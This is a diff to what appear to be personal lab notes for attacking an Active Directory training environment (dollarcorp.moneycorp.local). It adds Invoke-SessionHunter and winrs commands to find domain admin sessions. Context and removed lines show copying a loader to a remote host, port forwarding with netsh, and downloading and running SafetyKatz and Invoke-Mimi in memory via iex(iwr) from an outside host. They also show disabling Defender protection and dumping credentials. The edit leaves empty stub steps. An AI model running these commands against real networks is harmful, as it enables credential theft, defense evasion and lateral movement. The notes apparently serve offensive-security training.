@@ -57,6 +57,13 @@ set username
 set computername
 ```
 
+# Finding domain admin session
+```powershell
+. C:\AD\Tools\Invoke-SessionHunter.ps1
+Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
+winrs -r:dcorp-mgmt cmd /c "set computername && set username"
+```
+
 # Lateral Movement 
 ```powershell
 One-To-One
@@ -104,17 +111,9 @@ PS> echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loade
 PS> $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
 
 #4- Use Loader.exe to download and execute SafetyKatz.exe in-memory on dcorp-mgmt
-PS> $null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
+PS> 
 
-
-#After Abusing PowerShell Remoting
-#1- Host Invoke-Mimi.ps1 & Run the following command on the reverse shell
-iex (iwr http://172.16.100.X/Invoke-Mimi.ps1 -UseBasicParsing)
-
-#2- Disable AMSI & Dump the hashes
-PS> $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
-PS> Invoke-Command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
-PS> Invoke-Command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
+#5- 
 ```
 
 ```Powershell
